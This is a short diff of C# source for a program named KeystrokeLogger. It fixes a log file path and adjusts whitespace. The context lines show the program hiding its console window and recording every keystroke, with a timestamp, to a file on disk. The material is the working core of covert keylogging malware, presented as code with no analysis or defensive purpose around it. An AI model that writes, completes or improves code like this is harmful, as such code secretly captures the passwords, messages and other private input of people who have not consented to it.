@@ -37,7 +37,7 @@ namespace KeystrokeLogger
 
             var handle = GetConsoleWindow();
 
-            randomFilename = "keylog" + SerialServices.Filename;
+            randomFilename = "\\keylog" + SerialServices.Filename;
             
             // Hide
             ShowWindow(handle, SW_HIDE);
@@ -66,7 +66,7 @@ namespace KeystrokeLogger
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 StreamWriter sw = new StreamWriter(Application.StartupPath + randomFilename, true);
-                sw.Write((wParam-256) + ",");
+               sw.Write((wParam-256) + ",");
                 sw.Write((Keys)vkCode + ",");
                 sw.Write(Utils.GetTimestamp(DateTime.Now) + "\n");                
                 sw.Close();
